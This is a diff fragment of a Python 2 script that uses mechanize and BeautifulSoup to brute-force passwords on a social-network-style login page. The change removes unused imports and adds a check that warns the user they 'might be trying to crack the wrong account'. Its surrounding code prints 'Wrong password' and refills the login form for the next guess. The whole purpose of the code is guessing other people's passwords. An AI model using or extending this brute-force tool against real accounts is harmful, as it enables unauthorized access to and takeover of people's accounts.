@@ -3,10 +3,8 @@
 import mechanize
 import time
 import os
-import random
 import ConfigParser
 from multiprocessing import Process
-from multiprocessing import Queue
 from bs4 import BeautifulSoup
 from lazyme.string import color_print
 
@@ -82,9 +80,14 @@ def def_login():
 			# Find action="/login.php?login_attempt= using beautiful soup
 			soup = BeautifulSoup(request, 'html.parser')
 
-
 			# Attempt to brute force the password.
 			attempt = soup.find_all(action="/login.php?login_attempt=1&lwv=120&lwc=1348092")
+			account = soup.find_all(action="/login.php?login_attempt=1&lwv=120&lwc=1647001")
+			if (len(account) > 0):
+				color_print("[!] You might be trying to crack the wrong account", color='red')
+				break
+
+
 			if (len(attempt) > 0):
 				print("[!] Wrong password")
 				browser.select_form(nr = 0)
